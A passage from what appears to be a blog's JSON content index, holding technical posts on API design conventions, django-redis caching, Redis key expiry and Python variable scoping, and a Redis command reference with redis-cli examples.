The pagination token in the List request. || `page_size` | `int32` | The pagination size in the List request. || `total_size` | `int32` | The total count of items in the list irrespective of pagination. || `next_page_token` | `string` | The next pagination token in the List response. It should be used as `page_token` for the following request. An empty value means no more result. || `order_by` | `string` | Specifies the result ordering for List requests. || `request_id` | `string` | A unique string id used for detecting duplicated requests. || `resume_token` | `string` | An opaque token used for resuming a streaming request. || `labels` | `map` | Represents Cloud resource labels. || `deleted` | `bool` | If a resource allows undelete behavior, it must have a `deleted` field indicating the resource is deleted. || `show_deleted` | `bool` | If a resource allows undelete behavior, the corresponding List method must have a `show_deleted` field so client can discover the deleted resources. || `update_mask` | [`FieldMask`](https://github.com/google/protobuf/blob/master/src/google/protobuf/field_mask.proto) | It is used for `Update` request message for performing partial update on a resource. This mask is relative to the resource, not to the request message. || `validate_only` | `bool` | If true, it indicates that the given request should only be validated, not executed. |## ErrorIf you are a server developer, you should generate errors with enough information to help client developers understand and address the problem. At the same time, you must be aware of the security and privacy of the user data, and avoid disclosing sensitive information in the error message and error details, since errors are often logged and may be accessible by others. For example, an error message like &quot;Client IP address is not on whitelist 128.0.0.0/8&quot; exposes information about the server-side policy, which may not be accessible to the user.### Error CodesGoogle APIs **must** use the canonical error codes defined by [`google.rpc.Code`](https://github.com/googleapis/googleapis/blob/master/google/rpc/code.proto). Individual APIs **should** avoid defining additional error codes, since developers are very unlikely to write logic to handle a large number of error codes. For reference, handling an average of 3 error codes per API call would mean most application logic would just be for error handling, which would not be a good developer experience.### Error MessagesThe error message should help users **understand and resolve** the API error easily and quickly. In general, consider the following guidelines when writing error messages:- Do not assume the user is an expert user of your API. Users could be client developers, operations people, IT staff, or end-users of apps.- Do not assume the user knows anything about your service implementation or is familiar with the context of the errors (such as log analysis).- When possible, error messages should be constructed such that a technical user (but not necessarily a developer of your API) can respond to the error and correct it.- Keep the error message brief. If needed, provide a link where a confused reader can ask questions, give feedback, or get more information that doesn&apos;t cleanly fit in an error message. Otherwise, use the details field to expand.## Naming Convertions## 存疑要不要保留 HTTP Method Code，比如 404、500，还是用错误码来表示异常情况（此时，所有 REST APIs 都返回 200 的 status code）# Traditional RPC APIs## MethodsOnly `GET` and `POST` method are allowed. We don&apos;t use `PUT` and `DELETE` in project.`GET` method is used to retrieve information from server, while `POST` requests are generally used to add / update / delete the data on server.- One notable exception is that, API that pass array to fetch batch data from server could be in `POST` method. This is because it is awkward to pass array of data to server using query string. You can pass array in JSON object in `POST` body. e.g. Simple requestPOST /api/order/get_list {“orders”:[100001, 100002]} 12 Complex requestPOST /api/item/get_list {“items”:[{“shopid”:1000,”itemid”:100001},{“shopid”:1000,”itemid”:100002}]} # Reference - https://cloud.google.com/apis/design/","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"},{"name":"ArchitectureDesign","slug":"Architecture/ArchitectureDesign","permalink":"http://swsmile.info/categories/Architecture/ArchitectureDesign/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"},{"name":"ArchitectureDesign","slug":"ArchitectureDesign","permalink":"http://swsmile.info/tags/ArchitectureDesign/"}]},{"title":"【Django】Django 使用 Redis","date":"2019-10-28T04:04:39.000Z","path":"2019/10/28/【Django】Django-使用-Redis/","text":"安装 Dependency1$ pip install django-redis 作为 cache backend 使用配置为了使用 django-redis , 在你项目下的setting.py中添加如下代码: 123456789CACHES = &#123; &quot;default&quot;: &#123; &quot;BACKEND&quot;: &quot;django_redis.cache.RedisCache&quot;, &quot;LOCATION&quot;: &quot;redis://127.0.0.1:6379/1&quot;, &quot;OPTIONS&quot;: &#123; &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot;, &#125; &#125;&#125; 为了更好的互操作性并使连接字符串更加 “标准”, 从 3.8.0 开始 django-redis 使用 redis-py native url notation 作为连接字符串. 在 Django 中访问 Redis通过django-redis访问 Redis以搜索 keys 过期为例： 123456&gt;&gt;&gt; from django.core.cache import cache&gt;&gt;&gt; cache.set(\"foo\", \"value\", timeout=25)&gt;&gt;&gt; cache.ttl(\"foo\")25&gt;&gt;&gt; cache.ttl(\"not-existent\")0 Basic usageThe basic interface is: 1234&gt;&gt;&gt; cache.set('my_key', 'hello, world!', 30)&gt;&gt;&gt; cache.get('my_key')&gt;&gt;&gt; 'hello, world!' key should be a str, and value can be any picklable Python object. The timeout argument is optional and defaults to the timeout argument of the appropriate backend in the CACHES setting (explained above). It’s the number of seconds the value should be stored in the cache. Passing in None for timeout will cache the value forever. A timeout of 0 won’t cache the value. If the object doesn’t exist in the cache, cache.get() returns None: 123&gt;&gt;&gt; # Wait 30 seconds for 'my_key' to expire...&gt;&gt;&gt; cache.get('my_key')None We advise against storing the literal value None in the cache, because you won’t be able to distinguish between your stored None value and a cache miss signified by a return value of None. cache.get() can take a default argument. This specifies which value to return if the object doesn’t exist in the cache: 12&gt;&gt;&gt; cache.get('my_key', 'has expired')'has expired' To add a key only if it doesn’t already exist, use the add() method. It takes the same parameters as set(), but it will not attempt to update the cache if the key specified is already present: 1234&gt;&gt;&gt; cache.set('add_key', 'Initial value')&gt;&gt;&gt; cache.add('add_key', 'New value')&gt;&gt;&gt; cache.get('add_key')'Initial value' 原生客户端使用在某些情况下你的应用需要进入原生 Redis 客户端，以使用一些 django cache 接口没有暴露出来的进阶特性。 为了避免储存新的原生连接所产生的另一份设置, django-redis 提供了方法 get_redis_connection(alias) 使你获得可重用的连接字符串： 123456$ python manager.py shell&gt;&gt;&gt; from django_redis import get_redis_connection&gt;&gt;&gt; con = get_redis_connection(\"default\")&gt;&gt;&gt; con&lt;redis.client.StrictRedis object at 0x2dc4510&gt;&gt;&gt;&gt; con.hset(\"hash1\",\"key1\",\"value1\") 接下来，你就可以像在 redis-cli中那样，在Python 中进行 Redis 读写操作。 以下列举了对于在 Redis 中几种不同的数据结构常用的操作命令。 基本操作 命令 含义 del key 删除key keys * 所有键 TTL key 查看还有多久过期 del name 删除name select 2 表示切换到2库，注：Django的cache是存在1库的(上面设置的)，进入redis的时候默认是0库的 expire key 100 设置过期时间100秒 EXPIRE name 300 设置name的300秒后自动过期 type name 查看name的属性（总共：string, list, hash, set,zset） ​ String 操作 字符 set name “wuanger” 创建“wuanger”，键为name get key 获取key这个键的值 append key aa 给一个值后面加aa，类似字符串相加 DERC key 给key的值-1，仅限数字 DERCBY key 4 给key的值-4，仅限数字 List 操作 含义 lpush list_name a b c d e f f e d c b a （依次从左边插入，如果该 list_name 不存在，就创建） rpush list_name g 从右边插入 lrange list_name 0 -1 显示所有内容（根据下表来的） lpop list_name 从左边删除第一个数，返回值是删除的那个数 rpop list_name 从右边删除一个数，返回值是删除的那个数 \u0014\u0014 操作 含义 hset hash_name key1 val1 hash_name = {key1: val1} hmset hash_name key1 val1 key2 val2 hash_name = {key1: val1, key2: val2} hget hash_name key1 获取key1 hmget hash_name key1 key2 获取多个key hgetall hash_name 获取所有key hkeys hash_name 获取所有的key hvals hash_name 获取所有的val hdel hash_name key 删除hash_name中的key ​ Set 操作 含义 sadd set1 val1 val2 添加一个set1集合里的值val1，val2 srem set1 val1 从set1中移除val1 smembers set1 set1的成员 sismember set1 val1 查看val1是否在set1里，是返回1，否返回0 sinter set1 set2 求交集 sunion set1 set2 求并集 sdiff set1 set2 求差集 zset（有序集合） 操作 含义 zadd zset1 score member 创建、添加一个zset1，member的分数是score(int) zrangebyscore zset1 0 100 withscores 得出zset1中分数score在0-100的member,score从小到大,后面的withscores是带score输出 zrevrangebyscore zset1 100 0 从大到小输出 zrange zset1 2 4 获取zset1中序号为3，4的member zrank zset1 a zset1中成员a的序号 zrem zset1 a 移除zset1中的a zcount zset1 1 6 获取score为1-6之间的member数量 Reference https://docs.djangoproject.com/en/dev/topics/cache/#the-low-level-cache-api https://django-redis-chs.readthedocs.io/zh_CN/latest/ https://docs.djangoproject.com/en/dev/topics/cache/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"},{"name":"Redis","slug":"Django/Redis","permalink":"http://swsmile.info/categories/Django/Redis/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】自动过期","date":"2019-10-28T03:52:35.000Z","path":"2019/10/28/【Redis】自动过期/","text":"自动过期Redis中有个设置时间过期的功能，通过 setex 或者 expire 关键字来实现。 1234567891011121314151617redis 127.0.0.1:6379&gt; hset expire:me name tom(integer) 0redis 127.0.0.1:6379&gt; hget expire:me name\"tom\" redis 127.0.0.1:6379&gt; expire expire:me 20(integer) 1redis 127.0.0.1:6379&gt; ttl expire:me # 获得还有多久过期，比如这里就是就有 19 秒才过期(integer) 19 ......... redis 127.0.0.1:6379&gt; ttl expire:me(integer) -1redis 127.0.0.1:6379&gt; hget expire:me name 即对存储在Redis数据库中的键值对（key-value pair）可以设置一个过期时间。作为一个缓存数据库，这是非常实用的。如我们一般项目中的token、登录信息或者短信验证码都是有时间限制的，按照传统的数据库处理方式，一般都是自己判断过期，这样无疑会严重影响项目性能。 Redis对存储值的过期处理实际上是针对该值的键（key）处理的，即时间的设置也是设置key的有效时间。 Expires字典保存了所有键的过期时间，Expires也被称为过期字段。 四种处理策略 EXPIRE：将key的生存时间设置为x秒，即 x 秒后该 key 会被自动删除。 PEXPIRE：将key的生成时间设置为 x 毫秒，即 x 毫秒后该 key 会被自动删除。 EXPIREAT：将key的过期时间设置为timestamp所代表的的秒数的时间戳，即到达该特定时间后，该 key 会被自动删除。 PEXPIREAT：将key的过期时间设置为timestamp所代表的的毫秒数的时间戳，即到达该特定时间后，该 key 会被自动删除。 其实，以上几种处理方式都是通过PEXPIREAT来实现的，设置生存时间的时候是redis内部计算好时间之后在内存处理的，最终的处理都会转向PEXPIREAT。 1、2两种方式是设置一个过期的时间段，就是咱们处理验证码最常用的策略，设置三分钟或五分钟后失效，把分钟数转换成秒或毫秒存储到redis中。3、4两种方式是指定一个过期的时间 ，比如优惠券的过期时间是某年某月某日，只是单位不一样。 删除策略过期键的处理就是把过期键删除，这里的操作主要是针对过期字段处理的。 Redis中有三种处理策略：定时删除、惰性删除和定期删除。 定时删除：在设置键的过期时间的时候创建一个定时器，当过期时间到的时候立马执行删除操作。不过这种处理方式是即时的，不管这个时间内有多少过期键，不管服务器现在的运行状况，都会立马执行，所以对CPU不是很友好。惰性删除：惰性删除策略不会在键过期的时候立马删除，而是当有 client获取这个键的时候才会主动删除。处理过程为：接收get执行、判断是否过期（这里按过期判断）、执行删除操作、返回nil（空）。定期删除：定期删除是设置一个时间间隔，每个时间段都会检测是否有过期键，如果有执行删除操作。这个概念应该很好理解。通过TTL命令用于获取键到期的剩余时间(秒)。 判断大于0还是其他，这样可以实现定期删除。 Reference redis hash结构如何设置过期时间 - https://blog.csdn.net/zhousenshan/article/details/77998448","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Python】变量作用域","date":"2019-10-27T12:58:22.000Z","path":"2019/10/27/【Python】Basics-变量作用域/","text":"Python的作用域分类Python的作用域一共有4种，分别是： L （Local） 局部作用域 E （Enclosing） 闭包函数外的函数中 G （Global） 全局作用域 B （Built-in） 内建作用域 以 L –&gt; E –&gt; G –&gt;B 的顺序去查找，即：当在局部作用域中找不到时，便会去局部作用域之外的作用域去找（例如闭包），再找不到就会去全局作用域中找，再者去内建作用域中找。最终，如果仍没有找到，则会抛出NameError错误。 下面举一个实用LEGB法则的例子： 1234567globalVar = 100 #Gdef test_scope(): enclosingVar = 200 #E def func(): localVar = 300 #Lprint __name__ #B Python的作用域分析除了def、class、lambda 之外，其他如 if、elif、else、try - except、 for、while的 statement并不能改变变量的作用域。换句话说，在这些 statement 之内声明的变量，在它们之外还是可以访问的，比如： 12345&gt;&gt;&gt; if True:&gt;&gt;&gt; ... a = 'I am A'&gt;&gt;&gt; ... &gt;&gt;&gt; a&gt;&gt;&gt; 'I am A' 在这个例子中，定义在 if 语句中的变量a，在 if 语句块的外部还是被可以访问的。 这意味着，如果if 语句块被 def 或 class 或 lambda 包裹，而且变量在 if 语句块中被声明，则该变量就是此函数、或类、或 lambda 的局部变量。 在 def 或 class 或 lambda 中声明的变量，其作用域就是对应方法、或者类、或者 lambda 的局部作用域。 局部作用域会覆盖全局作用域，但不会影响全局作用域。 123456789g = 1 #全局的def fun(): g = 2 #局部的 return gprint fun()# 结果为2print g# 结果为1 改变作用域的关键字global 关键字经典问题 - UnboundLocalError: local variable &lt;X&gt; referenced before assignmentProblem要注意，如果在函数内部修改了全局变量，就会出现以下错误： 12345678910111213#file1.pyvar = 1def fun1(): print var var = 200print fun()#file2.pyvar = 1def fun2(): var = var + 1 return varprint fun() 这两个函数都会报错：UnboundLocalError: local variable ‘var’ referenced before assignment。 在 file1.py 的中，变量 var 被赋值了，其实上面的实现等价于： 1234567#file1.pyvar = 1def fun(): var = None print var var = 200print fun() Analysis因为，这个 var 变量的作用域其实是整个 fun1() 函数，因此 Python Interpreter 会将所有在这个作用域下的变量在函数开头先进行声明（declaration）。 这样看，就很好理解为什么local variable &#39;var&#39; referenced before assignment，即在进行赋值操作前（ var = 200），该变量就被引用（referenced）了（即在 print var 语句中被引用了）。 你可能会说，我们已经在全局域下给 var 赋值了（var = 1），因此不应该报错。别忘了，当在局部作用域中找不到时，便会去局部作用域之外的作用域去找（在这个 case 中，局部作用域之外的作用域就是全局作用域）。而事实上，在函数的局部作用域中，我们已经声明了一个 var 变量（var = None），因此就不会再去部作用域之外的作用域找了。 Solution结论就是，如果我们要在函数中修改一个全局变量的值，需要在函数定义最开始的位置下声明 global {variable name}（在这个 case 中，就是 global var），这其实是告诉 Python Interpreter ，在当前作用域中的变量 var，就是全局作用域下的那个 var。 闭包（Closure） - nonlocal 关键字闭包的定义：如果在一个内部函数里，对在外部函数中声明（但不是在全局作用域）的变量进行引用，那么内部函数就被认为是闭包（closure）。 1234567891011121314151617a = 1def external(): global a a = 200 print a b = 100 def internal(): # nonlocal b print b b = 200 return b internal() print bprint external() 如果运行这段代码，会在 print b 位置报 UnboundLocalError: local variable &#39;b&#39; referenced before assignment 的错误。 这其实还是因为我们在更小的作用域（即 internal()中）修改了在更大的作用域（即 external()中）中声明的变量，虽然错误不是报在修改变量的那一行。 在Python3，有个关键字nonlocal可以解决这个问题；而在Python2中，没有这个关键字，因此不要尝试修改闭包中的变量。 locals() 和 globals()globals() 和 locals() 提供了基于字典的访问全局变量和局部变量的方式 globals()比如：如果一个函数A（对应于下面 case 的a()）内需要定义一个局部变量，而这个局部变量的名字和另一个函数B（对应于下面 case 的 b()）的名字相同，但又要在函数 A内引用这个函数B。 1234567891011121314def b(): print(\"call b()\")def a(): b = 'Just a String' b_function = globals()['b'] print b b_function() print(type(b_function))a()# Just a String# call b()# &lt;type 'function'&gt; locals()如果你使用过Python的Web框架，那么你一定经历过需要把一个视图函数内很多的局部变量传递给模板引擎，然后作用在HTML上。虽然你可以有一些更聪明的做法，还你是仍想一次传递多个变量。 123456789@app.route('/')def view(): user = User.query.all() article = Article.query.all() ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) s = 'Just a String' return render_template('index.html', user=user, article = article, ip=ip, s=s) #或者 return render_template('index.html', **locals()) Reference Python 变量作用域 - https://blog.csdn.net/cc7756789w/article/details/46635383","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Redis】Redis 操作","date":"2019-10-27T12:45:51.000Z","path":"2019/10/27/【Redis】Redis-操作/","text":"Redis中的所有数据结构均不支持数据类型的嵌套。比如，集合类型的每个元素都只能是字符串，而不能是另一个集合或散列表（Hash）。 字符串（String）SET - 插入数据 Time complexity: O(1) Set key to hold the string value. If key already holds a value, it is overwritten, regardless of its type. 如果当前 key 已经存在 value，则用新 value 覆盖原有的value值。 一旦设置成功（无论当前有没有发生覆盖），则返回OK；如果没设置成功，返回 nil （比如 options中包含了 nx，这时，只有当当前 key 不存在 value时，才会真正去设置value，即无覆盖发生。否则，就会返回 nil）。 Return Value Simple string reply: OK if SET was executed correctly. Null reply: a Null Bulk Reply is returned if the SET operation was not performed because the user specified the NX or XX option but the condition was not met. OptionsThe SET command supports a set of options that modify its behavior: EX seconds – Set the specified expire time, in seconds. PX milliseconds – Set the specified expire time, in milliseconds. NX – Only set the key if it does not already exist. 123456127.0.0.1:6379&gt; set a ccOK127.0.0.1:6379&gt; set a ccccOK127.0.0.1:6379&gt; set a ddd NX(nil) XX – Only set the key if it already exist. KEEPTTL – Retain the time to live associated with the key. GET - 读数据 Time complexity: O(1) Get the value of key. If the key does not exist the special value nil is returned. An error is returned if the value stored at key is not a string, because GET only handles string values. 即，如果当前key没有value值，则返回null APPEND - 数据追加 如果当前key的value有值则附加到原有string后面，如果没有则写入。返回值为追加后的数据长度 DEL - 数据删除 Time complexity: O(N) where N is the number of keys that will be removed. When a key to remove holds a value other than a string, the individual complexity for this key is O(M) where M is the number of elements in the list, set, sorted set or hash. Removing a single key that holds a string value is O(1). Removes the specified keys. A key is ignored if it does not exist. Return valueInteger reply: The number of keys that were removed. 123456789101112127.0.0.1:6379&gt; set name weiOK127.0.0.1:6379&gt; get name\"wei\"127.0.0.1:6379&gt; append name isgreat(integer) 10127.0.0.1:6379&gt; get name\"weiisgreat\"127.0.0.1:6379&gt; del wei(integer) 0127.0.0.1:6379&gt; get wei(nil) 散列类型（Hash）Redis是采用字典结构以键值对的形式存储数据的，而散列类型（hash）的键值也是一种字典结构，其存储了字典（field）和字段值的映射，但字段值只能是字符串，不支持其他数据类型（换句话说，散列类型不能嵌套其他的数据类型）。 HSET命令用来给字段赋值，而HGET用来获得字段的值。 123456127.0.0.1:6379&gt; HSET car price 500(integer) 0127.0.0.1:6379&gt; HSET car name BMW(integer) 1127.0.0.1:6379&gt; HGET car name\"BMW\" HSET命令的方便之处在于不区分插入和更新操作，这意味着修改数据时不用事先判断字段是否存在来决定要执行的是插入操作（update）还是更新操作（insert)。当执行的是插入操作时（即之前字段不存在）HSET命令会返回1，当执行的是更新操作时（即之前字段已经存在）HSET命令会返回0。更进一步，当键本身不存在时，HSET命令还会自动建立它。 hget - 获取某个值Time complexity: O(1) Returns the value associated with field in the hash stored at key. 12127.0.0.1:6379&gt; HGET car name\"BMW\" Return valueBulk string reply: the value associated with field, or nil when field is not present in the hash or key does not exist. Examples1234567redis&gt; HSET myhash field1 \"foo\"(integer) 1redis&gt; HGET myhash field1\"foo\"redis&gt; HGET myhash field2(nil)redis&gt; hset - 写入某个值Time complexity: O(1) for each field/value pair added, so O(N) to add N field/value pairs when the command is called with multiple field/value pairs. 12127.0.0.1:6379&gt; HSET car price 500(integer) 1 Sets field in the hash stored at key to value. If key does not exist, a new key holding a hash is created. If field already exists in the hash, it is overwritten. As of Redis 4.0.0, HSET is variadic and allows for multiple field/value pairs. Return valueInteger reply: The number of fields that were added. Example12345redis&gt; HSET myhash field1 \"Hello\"(integer) 1redis&gt; HGET myhash field1\"Hello\"redis&gt; hmset - 同时读取多个值Time complexity: O(N) where N is the number of fields being requested. Returns the values associated with the specified fields in the hash stored at key. For every field that does not exist in the hash, a nil value is returned. Because non-existing keys are treated as empty hashes, running HMGET against a non-existing key will return a list of nil values. Return valueArray reply: list of values associated with the given fields, in the same order as they are requested. Examples123456789redis&gt; HSET myhash field1 \"Hello\"(integer) 1redis&gt; HSET myhash field2 \"World\"(integer) 1redis&gt; HMGET myhash field1 field2 nofield1) \"Hello\"2) \"World\"3) (nil)redis&gt; [deprecated] hmset - 同时写入多个值Time complexity: O(N) where N is the number of fields being set. Sets the specified fields to their respective values in the hash stored at key. This command overwrites any specified fields already existing in the hash. If key does not exist, a new key holding a hash is created. As per Redis 4.0.0, HMSET is considered deprecated. Please use HSET in new code. 1127.0.0.1:6379&gt; HMSET key field value [field value ...] 同时将多个field - value（域-值）对写入到哈希表key中。此命令会覆盖哈希表中已存在的域。如果key不存在（哈希表不存在），一个空哈希表被创建并执行hmset操作。 Return valueSimple string reply Examples1234567redis&gt; HMSET myhash field1 \"Hello\" field2 \"World\"\"OK\"redis&gt; HGET myhash field1\"Hello\"redis&gt; HGET myhash field2\"World\"redis&gt; hexists - 查看指定 field 是否存在Time complexity: O(1) Returns if field is an existing field in the hash stored at key. 1127.0.0.1:6379&gt; HEXISTS key field 查看指定哈希表key中，指定域field是否存在。 Return valueInteger reply, specifically: 1 if the hash contains field. 0 if the hash does not contain field, or key does not exist. Examples1234567redis&gt; HSET myhash field1 \"foo\"(integer) 1redis&gt; HEXISTS myhash field1(integer) 1redis&gt; HEXISTS myhash field2(integer) 0redis&gt; hkeys - 获取所有 field1127.0.0.1:6379&gt; HKEYS key 获得指定哈希表中key所有的field。 列表（List） 列表类型（list）可以存储一个有序的字符串列表，常用的操作是向列表两端添加元素， 或者获得列表的某一个片段。 Redis中的List数据结构是链表结构，这意味这无论数据量多大，头尾操作数据还是很快的，list的容量是2的32次方减1个元素，即4294967295个元素数量 更具体的来说，列表类型内部使用双向链表（double linked list）实现，因此向列表两端添加元素的时间复杂度为0(1)，获取越接近两端的元素速度就越快。这意味着即使是一个有几千万个元素的列表，获取头部或尾部的10条记录也是极快的（和从只有20个元素的列表中获取头部或尾部的10条记录的速度是一样的）。 不过使用链表的代价是通过索引访问元素比较慢，设想在iPad mini发售当天有1000 个人在三里屯的苹果店排队等候购买，这时苹果公司宣布为了感谢大家的排队支持，决定奖励排在第486位的顾客一部免费的iPad mini。为了找到这第486位顾客，工作人员不得不从队首一个一个地数到第486个人。但同时，无论队伍多长，新来的人想加入队伍的话直接排到队尾就好了，和队伍里有多少人没有任何关系。这种情景与列表类型的 特性很相似。 LPUSH - 增加元素LPUSH命令用来向列表左边增加元素，返回值表示增加元素后的列表长度。 12345127.0.0.1:6379&gt; LPUSH numbers 1(integer) 1# LPUSH命令还支持同时增加多个元素，此时，LPUSH会先向列表左边加入“2”，然后再加入“3”127.0.0.1:6379&gt; LPUSH numbers 2 3(integer) 3 若想向列表右边增加元素，可使用RPUSH命令，其用法与LPUSH命令一致。 12127.0.0.1:6379&gt; RPUSH numbers 0 -1(integer) 5 从列表两端弹出元素有进有出，LPOP命令可以从列表左边弹出一个元素。LPOP命令执行两步操作： 第一步是将列表左边的元素从列表中移除 第二步是返回被移除的元素值。例如，从numbers 列表左边弹出一个元素（也就是”3”): 1234127.0.0.1:6379&gt; LPOP numbers\"3\"127.0.0.1:6379&gt; RPOP numbers\"-1\" 集合（Set）集合的概念高中的数学课就学习过。在集合中的每个元素都是不同的，且没有顺序。 一个集合类型（set)键可以存储至多232 -1个（相信这个数字对大家来说已经很熟悉了）字符串。 集合类型的常用操作是向集合中加入或刪除元素、判断某个元素是否存在等，由于集合类型在Redis内部是使用值为空的散列表（hash table)实现的，所以这些操作的时间复杂度都是0(1)。谅方便的是多个集合类型键之间还可以进行并集、交集和差集运算。 SADD - 增加元素 Time complexity: O(1) for each element added, so O(N) to add N elements when the command is called with multiple arguments. Add the specified members to the set stored at key. Specified members that are already a member of this set are ignored. If key does not exist, a new set is created before adding the specified members. An error is returned when the value stored at key is not a set. SADD命令用来向集合中增加一个或多个元素，如果键不存在则会自动创建。因为在一个集合中不能有相同的元素，所以如果要加入的元素己经存在于集合中就会忽略这个元素。本命令的返回值是成功加入的元素数量（忽略的元素不计算在内）。例如： 12345127.0.0.1:6379&gt; SADD letters a(integer) 1127.0.0.1:6379&gt; SADD letters a b c(integer) 2127.0.0.1:6379&gt; 第二条SADD命令的返回值为2，是因为元素“a”已经存在，所以实际上 SADD letters a b c 命令只加入了两个元素。 Return valueInteger reply: the number of elements that were added to the set, not including all the elements already present into the set. SREM - 删除元素SREM命令用来从集合中删除一个或多个元素，并返回删除成功的个数，例如： 12127.0.0.1:6379&gt; SREM letters c d(integer) 1 由于元素“d”在集合中不存在，所以只删除了一个元素，返回值为1。 SMEMBERS - 获得集合中的所有元素 Time complexity: O(N) where N is the set cardinality. SMEMBERS命令会返回集合中的所有元素，例如: 123127.0.0.1:6379&gt; SMEMBERS letters1) \"b\"2) \"a\" In this case, the time complexity of this operation is O(n) (O(2)), since letters contains two elements. Returns all the members of the set value stored at key. This has the same effect as running SINTER with one argument key. Return valueArray reply: all elements of the set. SISMEMBER - 判断元素是否在集合中判断一个元素是否在集合中是一个时间复杂度为0(1)的操作，无论集合中有多少个元素，SISMEMBER命令始终可以极快地返回结果。当值存在时SISMEMBER命令返回1，当值不存在或键不存在时返回0，例如： 123456127.0.0.1:6379&gt; SISMEMBER letters a(integer) 1127.0.0.1:6379&gt; SISMEMBER letters b(integer) 1127.0.0.1:6379&gt; SISMEMBER letters d(integer) 0 有序集合（Sorted Set）有序集合类型（sorted set）的特点从它的名字中就可以猜到，它与上一节介绍的集合类型的区别就是“有序”二字。 在集合类型的基础上有序集合类型为集合中的每个元素都关联了一个分数，这使得我们不仅可以完成插入、删除和判断元素是否存在等集合类型支持的操作，还能够获得分数最高（或最低）的前N个元素、获得指定分数范围内的元素等与分数有关的操作。虽然集合中每个元素都是不同的，但是它们的分数却可以相同。 有序集合类型在某些方面和列表类型有些相似。 二者都是有序的。 二者都可以获得某一范围的元素。 但是二者有着很大的区别，这使得它们的应用场景也是不同的。 (1) 列表类型是通过链表实现的，获取靠近两端的数据速度极快，而当元素增多后， 访问中间数据的速度会较慢，所以它更加适合实现如“新鲜事”或“日志”这样很少访问 中间元素的应用。 (2) 有序集合类型是使用散列表和跳跃表（Skip Hst）实现的，所以即使读取位于中间部分的数据速度也很快（时间复杂度是127.0.0.1:6379&gt;O(log_2N)127.0.0.1:6379&gt; ）。 (3) 列表中不能简单地调整某个元素的位置，但是有序集合可以（通过更改这个元素的分数)。 (4) 有序集合要比列表类型更耗费内存。 ZADD - 增加元素1127.0.0.1:6379&gt; ZADD key score member [score member ...] ZADD命令用来向有序集合中加入一个元素和该元素的分数，如果该元素己经存在则会新的分数替换原打的分数。ZADD命令的返回值是新加入到集合中的元素个数（不包含之前已经存在的元素）。 假设我们用有序集合模拟计分板，现在要记录Tom、Peter和David三名运动员的分数 (分别是89分、67分和100分）： 12127.0.0.1:6379&gt; ZADD scoreboard 89 Tom 67 Peter 100 David(integer) 3 这时我们发现Peter的分数录入有误，实际的分数应该是76分，可以用ZADD命令修改Peter的分数： 12127.0.0.1:6379&gt; ZADD scoreboard 76 Peter(integer) 0 分数不仅可以是整数，还支持双精度浮点数: 1234127.0.0.1:6379&gt; ZADD tastboard 17E+307 a(integer) 1127.0.0.1:6379&gt; ZADD testboard 1.5 b(integer) 1 ZSCORE - 获得元素的分数1127.0.0.1:6379&gt; ZSCORE key member 12127.0.0.1:6379&gt; ZSCORE scoreboard Tom\"89\" ZRANGE - 获得排名在某个范围的元素列表12127.0.0.1:6379&gt; ZRANGE key start stop [WITHSCORES]127.0.0.1:6379&gt; ZREVRANGE key start stop [WITHSCORES] ZRANGE命令会按照元素分数从小到大的顺序返回索引从start到stop之间的所有元素（包含两端的元素）。ZRANGE命令与LRANGE命令十分相似，如索引都足从0开始， 负数代表从后向前査找（-1表示最后一个元素)。就像这样： 12345678910127.0.0.1:6379&gt; ZRANGE scoreboard 0 21) \"Peter\"2) \"Tom\"3) \"David\"127.0.0.1:6379&gt; ZRANGE scoreboard 0 11) \"Peter\"2) \"Tom\"127.0.0.1:6379&gt; ZRANGE scoreboard 1 -11) \"Tom\"2) \"David\" ZRANGEBYSCORE - 获得指定分数范围的元素1127.0.0.1:6379&gt; ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count] ZRANGEBYSCORE命令参数虽然多，但是都很好理解。该命令按照元素分数从小到大的顺序返回分数在min和max之间（包含min和max）的元素： redis&gt; ZRANGEBYSCORE scoreboard 80 100 1) “Tom” 2) “David” 如果希望分数范围不包含端点值，可以在分数前加上“(”符号。例如，希望返回”80 分到100分的数据，可以含80分，但不包含100分，则稍微修改一下上面的命令即可： 12127.0.0.1:6379&gt; ZRANGEBYSCORE scoreboard 80 (1001) \"Tom\" min和max还支持无穷大，同ZADD命令一样，-inf和+ inf分别表示负无穷和正无穷。比如你希望得到所有分数高于80分（不包含80分）的人的名单，但你却不知道最高分是多少（虽然有些背离现实，但是为了叙述方便，这里假设可以获得的分数是无上限的）, 这时就可以用上+inf 了： 123127.0.0.1:6379&gt; ZRANGEBYSCORE scoraboard (80 +inf1) \"Torn”2) \"David” WITHSCORES参数的用法与ZRANGE命令一样，不再赘述。 其他操作123456# 删除所有key127.0.0.1:6379&gt; flushall# 列出所有key127.0.0.1:6379&gt; key *#列出满足特定正则的key127.0.0.1:6379&gt; key ... Reference https://redis.io/commands 《Redis入门指南》 《Redis设计与实现》 缓存穿透，缓存击穿，缓存雪崩解决方案分析 - https://blog.csdn.net/zeb_perfect/article/details/54135506 Redis架构之防雪崩设计：网站不宕机背后的兵法 - https://mp.weixin.qq.com/s/TBCEwLVAXdsTszRVpXhVug? 为什么说Redis是单线程的以及Redis为什么这么快！ - https://blog.csdn.net/xlgen157387/article/details/79470556 Redis 网络架构及单线程模型 - http://blog.jobbole.com/100079/ 这可能是目前最全的Redis高可用技术解决方案总结 - https://mp.weixin.qq.com/s/r1ig-jO13YxbqrofJzmkfw Redis 